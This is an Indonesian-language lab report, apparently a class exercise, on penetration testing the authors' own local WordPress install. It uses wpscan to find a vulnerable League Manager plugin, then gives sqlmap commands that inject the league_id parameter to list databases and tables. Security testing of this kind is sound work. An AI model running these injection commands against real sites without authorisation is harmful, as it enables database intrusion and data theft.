# Uji Coba Penetrasi

Pada uji coba ini kami mengecek kelemahan wordpress yang sudah kami install dengan meggunakan wpscan dan kemudian mencari referensi kemungkinan penyerangan sql injection dari halaman yang di outputkan oleh wpscan. Kemudian kami mencoba penetrasi dengan menggunakan sqlmap pada linux.

## WPScan

WPScan akan mendeteksi kelemahan yang ada dari wordpress yang hasilnya berupa referensi pada internet yang memberikan informasi kelemahan yang ada, pada wordpress dan bahkan pada plugin yang ada.

Setelah berhasil menginstall WPScan, WPScan dapat dijalankan dengan menggunakan perintah sebagai berikut untuk mengecek kelemahan wordpress yang terdapat pada suatu alamat URL web.
```bash
ruby wpscan.rb -u "<URL-Wordpress>"
```
Contoh :
```bash
ruby wpscan.rb -u "10.151.32.113"
```
Pada contoh diatas, kami memiliki halaman wordpress pada jaringan lokal yang dapat diakses melalui ip 10.151.32.113. Berikut hasil yang di tampilkan oleh WPScan :

![WPScan URI 1](/Images/WPScan-URI1.png)
![WPScan URI 1](/Images/WPScan-URI2.png)

Kemudian untuk mencari cara injeksi buka salah satu halaman referensi yang diberikan oleh WPScan. Dalam kasus ini kami memilih referensi dari halaman [exploit-db](https://www.exploit-db.com/exploits/37182/) yang menjadi salah satu referensi plugin League Manager 3.9.1.1.

![Exploit DB](/Images/exploit-db.png)

Dari halaman tersebut kami mendapat informasi kelemahan yang dimiliki oleh plugin League Manager terdapat pada uri
```bash	
python sqlmap.py --url="<Halaman Wordpress/>/?season=<season yang terdaftar>&league_id=<liga yang terdaftar>" -p <parameter pembantu dalam injeksi>
```
Contoh :
```bash
python sqlmap.py --url="10.151.32.113/?season=2017&league_id=7" -p league_id --dbs
```
Berikut hasil dari injeksi yang didapat melalui sqlmap pada contoh :

![SQLMap DBS](/Images/SQLMap-DBS.png)

Akan tetapi, hasil yang didapat tidak menampilkan semua data yang terdapat pada database MySQL sesungguhnya :

![MySQL Databases](/Images/MySQL-Database.png)

Dengan menggunakan SQLMap kami juga berhasil mendapatkan nama nama tabel yang ada pada database wordpress dengan cara berikut :
```bash
python sqlmap.py --url="10.151.32.113/?season=2017&league_id=7" -p league_id -D wordpress --tables
```

![SQLMap Tables](/Images/SQLMap-Tables.png)

## Referensi

Untuk referensi tambahan berikut link [referensi](https://www.youtube.com/watch?v=F5o903DHq0U) untuk explorasi sqlmap berupa vidio tutorial youtube.